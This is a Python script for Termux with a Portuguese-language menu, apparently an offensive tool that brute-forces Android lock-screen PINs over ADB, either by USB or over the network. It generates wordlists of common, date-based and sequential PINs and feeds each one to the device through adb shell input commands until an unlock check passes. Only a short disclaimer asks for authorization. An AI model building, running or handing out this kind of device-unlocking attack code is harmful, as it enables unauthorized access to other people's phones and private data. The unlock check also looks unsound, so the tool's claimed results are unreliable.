#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import subprocess
import threading
import socket
import re
from typing import Dict, List, Optional, Tuple
from datetime import datetime

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress, BarColumn, TextColumn
from rich.text import Text
from rich.syntax import Syntax
from rich.layout import Layout
from rich.live import Live
from rich.columns import Columns

console = Console()

class BruteForcePIN:
    def __init__(self):
        self.banners = [
            self._gerar_banner_principal(),
            self._gerar_banner_execucao()
        ]
        
        self.metodos_ataque = {
            'adb_direct': {
                'nome': 'ADB Direto (Via USB)',
                'descricao': 'Ataque direto via cabo USB usando ADB',
                'requer_cabo': True,
                'velocidade': 'Rápida',
                'func': self._ataque_adb_direto
            },
            'adb_network': {
                'nome': 'ADB Network (Rede)',
                'descricao': 'Ataque via rede quando ADB over TCP está ativado',
                'requer_cabo': False,
                'velocidade': 'Média',
                'func': self._ataque_adb_rede
            }
        }
        
        self.pin_lists = {
            'comuns': self._gerar_pins_comuns(),
            'datas': self._gerar_pins_datas(),
            'sequencias': self._gerar_pins_sequencias(),
            'personalizado': []
        }
        
        self.dispositivo_alvo = None
        self.adb_path = self._encontrar_adb()
        self.pin_encontrado = None
        self.tentativas = 0
        self.taxa_sucesso = 0
        
    def _gerar_banner_principal(self) -> str:
        return r"""[bold red]
███████╗ ██████╗ ██████╗  █████╗ ████████╗███████╗    ██████╗ ██╗███╗   ██╗
██╔════╝██╔═══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝    ██╔══██╗██║████╗  ██║
█████╗  ██║   ██║██████╔╝███████║   ██║   █████╗      ██████╔╝██║██╔██╗ ██║
██╔══╝  ██║   ██║██╔══██╗██╔══██║   ██║   ██╔══╝      ██╔═══╝ ██║██║╚██╗██║
██║     ╚██████╔╝██║  ██║██║  ██║   ██║   ███████╗    ██║     ██║██║ ╚████║
╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═══╝
                                                                           
██████╗ ██╗     ██╗   ██╗███████╗    ███████╗ ██████╗██████╗ ███████╗███████╗
██╔══██╗██║     ██║   ██║██╔════╝    ██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝
██████╔╝██║     ██║   ██║█████╗      ███████╗██║     ██████╔╝█████╗  ███████╗
██╔══██╗██║     ██║   ██║██╔══╝      ╚════██║██║     ██╔══██╗██╔══╝  ╚════██║
██████╔╝███████╗╚██████╔╝███████╗    ███████║╚██████╗██║  ██║███████╗███████║
╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝
[/bold red]"""

    def _gerar_banner_execucao(self) -> str:
        return r"""[bold green]
╔══════════════════════════════════════════════════════════════╗
║                   EXECUÇÃO EM ANDAMENTO                      ║
║                                                              ║
║  [blink]🔓 BRUTE FORCE PIN ATTACK - INICIADO[/blink]                ║
║                                                              ║
║  ⚡ Testando combinações...                                  ║
║  📱 Alvo: {target}                                          ║
║  ⏰ Iniciado: {time}                                        ║
║  🔄 Tentativas: {attempts}                                  ║
║  📊 Sucesso: {success_rate}%                                ║
╚══════════════════════════════════════════════════════════════╝
[/bold green]"""

    def mostrar_banner_principal(self):
        console.clear()
        console.print(self.banners[0])
        console.print(Panel.fit(
            "[blink bold red]⚠️ USE APENAS EM DISPOSITIVOS PRÓPRIOS OU COM AUTORIZAÇÃO! ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)

    def mostrar_banner_execucao(self, target: str):
        banner = self.banners[1]
        banner = banner.replace("{target}", target)
        banner = banner.replace("{time}", datetime.now().strftime("%H:%M:%S"))
        banner = banner.replace("{attempts}", str(self.tentativas))
        banner = banner.replace("{success_rate}", str(self.taxa_sucesso))
        
        console.clear()
        console.print(banner)
        return banner

    def _encontrar_adb(self) -> str:
        # Verifica se o ADB está instalado no sistema
        possiveis_paths = [
            '/data/data/com.termux/files/usr/bin/adb',
            '/usr/bin/adb',
            '/bin/adb',
            '/system/bin/adb',
            'adb'  # Se estiver no PATH
        ]
        
        for path in possiveis_paths:
            try:
                result = subprocess.run([path, '--version'], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    return path
            except:
                continue
        
        console.print("[red]✗ ADB não encontrado! Instale com: pkg install android-tools[/red]")
        return None

    def _gerar_pins_comuns(self) -> List[str]:
        # PINs mais comuns e padrões
        comuns = [
            '1234', '0000', '1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999',
            '1212', '1234', '2000', '2001', '2002', '2003', '2004', '2005', '2006', '2007', '2008',
            '2009', '2010', '2011', '2012', '2013', '2014', '2015', '2016', '2017', '2018', '2019',
            '2020', '2021', '2022', '2023', '2024', '2580', '1111', '2222', '3333', '4444', '5555',
            '6666', '7777', '8888', '9999', '1004', '1020', '1029', '1122', '1212', '1234', '1313',
            '1324', '1357', '1478', '1590', '1593', '1680', '1723', '1800', '1984', '1990', '1991',
            '1992', '1993', '1994', '1995', '1996', '1997', '1998', '1999', '2000', '2001', '2002'
        ]
        return comuns

    def _gerar_pins_datas(self) -> List[str]:
        # PINs baseados em datas (DDMM, MMDD, YYYY)
        pins = []
        for ano in range(1950, 2025):
            pins.append(str(ano))
        
        for mes in range(1, 13):
            for dia in range(1, 32):
                pins.append(f"{dia:02d}{mes:02d}")
                pins.append(f"{mes:02d}{dia:02d}")
        
        return list(set(pins))  # Remove duplicatas

    def _gerar_pins_sequencias(self) -> List[str]:
        # Sequências numéricas
        sequencias = []
        
        # Sequências simples
        for i in range(0, 10):
            for j in range(0, 10):
                sequencias.append(f"{i}{i}{j}{j}")
                sequencias.append(f"{i}{j}{i}{j}")
                sequencias.append(f"{i}{j}{j}{i}")
        
        # Padrões de teclado
        padroes_teclado = [
            '1234', '2345', '3456', '4567', '5678', '6789',
            '7890', '0987', '9876', '8765', '7654', '6543', '5432', '4321',
            '1357', '2468', '3579', '4680', '5791', '6802', '7913', '8024',
            '9135', '0246'
        ]
        
        sequencias.extend(padroes_teclado)
        return list(set(sequencias))

    def _descobrir_dispositivos_adb(self) -> List[str]:
        """Descobre dispositivos conectados via ADB"""
        try:
            result = subprocess.run([self.adb_path, 'devices'], 
                                  capture_output=True, text=True, timeout=10)
            
            dispositivos = []
            for linha in result.stdout.split('\n')[1:]:
                if linha.strip() and 'device' in linha:
                    dispositivo_id = linha.split('\t')[0]
                    dispositivos.append(dispositivo_id)
            
            return dispositivos
        except:
            return []

    def _testar_conexao_adb(self, dispositivo: str) -> bool:
        """Testa se o ADB consegue se comunicar com o dispositivo"""
        try:
            result = subprocess.run([self.adb_path, '-s', dispositivo, 'shell', 'echo', 'test'],
                                  capture_output=True, text=True, timeout=10)
            return result.returncode == 0
        except:
            return False

    def _ataque_adb_direto(self, dispositivo: str, pin_list: List[str], progress) -> Optional[str]:
        """Ataque direto via ADB USB"""
        for i, pin in enumerate(pin_list):
            try:
                # Tenta desbloquear com o PIN
                comando = f"input text {pin} && input keyevent 66"
                result = subprocess.run([self.adb_path, '-s', dispositivo, 'shell', comando],
                                      capture_output=True, text=True, timeout=5)
                
                self.tentativas += 1
                
                # Verifica se o dispositivo foi desbloqueado
                if self._verificar_desbloqueio(dispositivo):
                    self.pin_encontrado = pin
                    return pin
                
                # Pequena pausa para evitar bloqueio
                time.sleep(0.1)
                
                # Atualiza progresso
                progress.update(progress.tasks[0], advance=1, 
                               description=f"[cyan]Testando PIN: {pin}[/cyan]")
                
            except subprocess.TimeoutExpired:
                continue
            except Exception as e:
                console.print(f"[yellow]Aviso: {str(e)}[/yellow]")
                continue
        
        return None

    def _ataque_adb_rede(self, ip: str, pin_list: List[str], progress) -> Optional[str]:
        """Ataque via ADB sobre rede"""
        # Primeiro tenta conectar via ADB over TCP
        try:
            subprocess.run([self.adb_path, 'connect', ip], 
                         capture_output=True, timeout=10)
            time.sleep(2)
            
            # Verifica se conectou
            dispositivos = self._descobrir_dispositivos_adb()
            dispositivo = next((d for d in dispositivos if ip in d), None)
            
            if dispositivo and self._testar_conexao_adb(dispositivo):
                return self._ataque_adb_direto(dispositivo, pin_list, progress)
            
        except:
            pass
        
        return None

    def _verificar_desbloqueio(self, dispositivo: str) -> bool:
        """Verifica se o dispositivo está desbloqueado"""
        try:
            # Tenta executar um comando que requer desbloqueio
            result = subprocess.run([self.adb_path, '-s', dispositivo, 'shell', 'am', 'start', '-a', 'android.intent.action.MAIN'],
                                  capture_output=True, text=True, timeout=5)
            
            # Se conseguir executar, provavelmente está desbloqueado
            return result.returncode == 0
        except:
            return False

    def menu_principal(self):
        while True:
            self.mostrar_banner_principal()
            
            tabela = Table(
                title="[bold cyan]🔓 MENU PRINCIPAL - BRUTE FORCE PIN[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Ação", style="green")
            tabela.add_column("Status", style="yellow")
            
            opcoes = [
                ("1", "Escolher Método de Ataque", "⚡"),
                ("2", "Configurar Lista de PINs", "🔧"),
                ("3", "Procurar Dispositivos", "🔍"),
                ("4", "Iniciar Ataque", "🚀"),
                ("5", "Estatísticas", "📊"),
                ("0", "Sair", "🚪")
            ]
            
            for opcao, acao, status in opcoes:
                tabela.add_row(opcao, acao, status)
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=["0", "1", "2", "3", "4", "5"],
                show_choices=False
            )
            
            if escolha == "1":
                self.escolher_metodo()
            elif escolha == "2":
                self.configurar_lista_pins()
            elif escolha == "3":
                self.procurar_dispositivos()
            elif escolha == "4":
                self.iniciar_ataque()
            elif escolha == "5":
                self.mostrar_estatisticas()
            elif escolha == "0":
                self.sair()

    def escolher_metodo(self):
        while True:
            console.clear()
            console.print(Panel.fit("[bold]🎯 ESCOLHER MÉTODO DE ATAQUE[/bold]", border_style="blue"))
            
            tabela = Table(show_header=True, header_style="bold green")
            tabela.add_column("ID", style="cyan")
            tabela.add_column("Método", style="white")
            tabela.add_column("Descrição", style="yellow")
            tabela.add_column("Velocidade", style="green")
            tabela.add_column("Cabo", style="red")
            
            for i, (codigo, metodo) in enumerate(self.metodos_ataque.items(), 1):
                tabela.add_row(
                    str(i),
                    metodo['nome'],
                    metodo['descricao'],
                    metodo['velocidade'],
                    "✓" if metodo['requer_cabo'] else "✗"
                )
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione o método",
                choices=[str(i) for i in range(1, len(self.metodos_ataque) + 1)] + ["0"],
                show_choices=False
            )
            
            if escolha == "0":
                return
            
            metodo_escolhido = list(self.metodos_ataque.keys())[int(escolha) - 1]
            self.metodo_atual = metodo_escolhido
            
            console.print(f"[green]✓ Método selecionado: {self.metodos_ataque[metodo_escolhido]['nome']}[/green]")
            time.sleep(1)
            break

    def configurar_lista_pins(self):
        while True:
            console.clear()
            console.print(Panel.fit("[bold]🔢 CONFIGURAR LISTA DE PINS[/bold]", border_style="green"))
            
            tabela = Table(show_header=True, header_style="bold blue")
            tabela.add_column("ID", style="cyan")
            tabela.add_column("Tipo", style="white")
            tabela.add_column("Quantidade", style="yellow")
            
            for i, (tipo, lista) in enumerate(self.pin_lists.items(), 1):
                if tipo != 'personalizado':
                    tabela.add_row(str(i), tipo.capitalize(), str(len(lista)))
            
            tabela.add_row("5", "Personalizado", str(len(self.pin_lists['personalizado'])))
            tabela.add_row("0", "Voltar", "-")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione a lista",
                choices=[str(i) for i in range(0, 6)],
                show_choices=False
            )
            
            if escolha == "0":
                return
            elif escolha == "5":
                self._configurar_lista_personalizada()
            else:
                tipos = list(self.pin_lists.keys())[:3]
                tipo_selecionado = tipos[int(escolha) - 1]
                self.lista_pins_atual = self.pin_lists[tipo_selecionado]
                console.print(f"[green]✓ Lista selecionada: {tipo_selecionado} ({len(self.lista_pins_atual)} PINs)[/green]")
                time.sleep(1)

    def _configurar_lista_personalizada(self):
        console.print("\n[bold]📝 Lista Personalizada[/bold]")
        console.print("[yellow]Digite os PINs (um por linha, 'fim' para terminar):[/yellow]")
        
        pins = []
        while True:
            pin = Prompt.ask("[cyan]PIN[/cyan]", default="fim")
            if pin.lower() == 'fim':
                break
            if pin.isdigit() and len(pin) == 4:
                pins.append(pin)
            else:
                console.print("[red]✗ PIN deve ter 4 dígitos![/red]")
        
        self.pin_lists['personalizado'] = pins
        self.lista_pins_atual = pins
        console.print(f"[green]✓ Lista personalizada criada com {len(pins)} PINs[/green]")

    def procurar_dispositivos(self):
        console.clear()
        console.print(Panel.fit("[bold]🔍 PROCURAR DISPOSITIVOS[/bold]", border_style="yellow"))
        
        if not self.adb_path:
            console.print("[red]✗ ADB não encontrado![/red]")
            time.sleep(2)
            return
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Procurando dispositivos...[/cyan]", total=100)
            
            # Verifica dispositivos USB
            progress.update(task, advance=30, description="[cyan]Verificando USB...[/cyan]")
            dispositivos_usb = self._descobrir_dispositivos_adb()
            
            # Verifica dispositivos em rede
            progress.update(task, advance=30, description="[cyan]Verificando rede...[/cyan]")
            # Aqui poderia adicionar varredura de rede
            
            progress.update(task, completed=100)
        
        if dispositivos_usb:
            console.print("[green]✓ Dispositivos encontrados:[/green]")
            for i, dispositivo in enumerate(dispositivos_usb, 1):
                console.print(f"  {i}. {dispositivo}")
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecionar dispositivo",
                choices=[str(i) for i in range(1, len(dispositivos_usb) + 1)] + ["0"],
                show_choices=False
            )
            
            if escolha != "0":
                self.dispositivo_alvo = dispositivos_usb[int(escolha) - 1]
                console.print(f"[green]✓ Dispositivo selecionado: {self.dispositivo_alvo}[/green]")
        else:
            console.print("[red]✗ Nenhum dispositivo encontrado![/red]")
            console.print("[yellow]• Conecte via USB e ative depuração USB[/yellow]")
            console.print("[yellow]• Ou configure ADB over TCP[/yellow]")
        
        time.sleep(2)

    def iniciar_ataque(self):
        if not hasattr(self, 'metodo_atual') or not self.metodo_atual:
            console.print("[red]✗ Selecione um método primeiro![/red]")
            time.sleep(2)
            return
        
        if not hasattr(self, 'lista_pins_atual') or not self.lista_pins_atual:
            console.print("[red]✗ Configure uma lista de PINs primeiro![/red]")
            time.sleep(2)
            return
        
        if not self.dispositivo_alvo and self.metodo_atual != 'adb_network':
            console.print("[red]✗ Selecione um dispositivo alvo primeiro![/red]")
            time.sleep(2)
            return
        
        # Prepara para o ataque
        metodo = self.metodos_ataque[self.metodo_atual]
        pin_list = self.lista_pins_atual
        
        # Mostra banner de execução
        target = self.dispositivo_alvo if self.dispositivo_alvo else "Rede"
        banner = self.mostrar_banner_execucao(target)
        
        # Inicia o ataque
        with Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TextColumn("({task.completed}/{task.total})")
        ) as progress:
            task = progress.add_task("[red]Testando PINs...[/red]", total=len(pin_list))
            
            # Executa o método de ataque escolhido
            if self.metodo_atual == 'adb_direct':
                resultado = self._ataque_adb_direto(self.dispositivo_alvo, pin_list, progress)
            elif self.metodo_atual == 'adb_network':
                # Para rede, precisaríamos de um IP alvo
                ip_alvo = Prompt.ask("[yellow]?[/yellow] IP do dispositivo", default="192.168.1.100")
                resultado = self._ataque_adb_rede(ip_alvo, pin_list, progress)
            
            # Verifica resultado
            if resultado:
                progress.update(task, description="[green]✓ PIN ENCONTRADO![/green]")
                console.print(Panel.fit(
                    f"[blink bold green]🎉 PIN DESCOBERTO: {resultado}[/blink bold green]\n"
                    f"📊 Tentativas: {self.tentativas}\n"
                    f"⏰ Tempo: {datetime.now().strftime('%H:%M:%S')}",
                    border_style="green"
                ))
            else:
                progress.update(task, description="[red]✗ PIN não encontrado[/red]")
                console.print(Panel.fit(
                    "[red]✗ Nenhum PIN funcionou![/red]\n"
                    f"📊 Tentativas: {self.tentativas}\n"
                    "💡 Tente com uma lista diferente",
                    border_style="red"
                ))
        
        input("\nPressione Enter para continuar...")

    def mostrar_estatisticas(self):
        console.clear()
        console.print(Panel.fit("[bold]📊 ESTATÍSTICAS[/bold]", border_style="cyan"))
        
        tabela = Table(show_header=False)
        tabela.add_row("Tentativas totais", str(self.tentativas))
        tabela.add_row("PINs testados", str(len(self.lista_pins_atual) if hasattr(self, 'lista_pins_atual') else "0"))
        tabela.add_row("Taxa de sucesso", f"{self.taxa_sucesso}%")
        tabela.add_row("Último PIN encontrado", self.pin_encontrado or "Nenhum")
        
        console.print(tabela)
        input("\nPressione Enter para continuar...")

    def sair(self):
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL É CRIME! ⚠️[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        brute_force = BruteForcePIN()
        brute_force.menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado pelo usuário[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
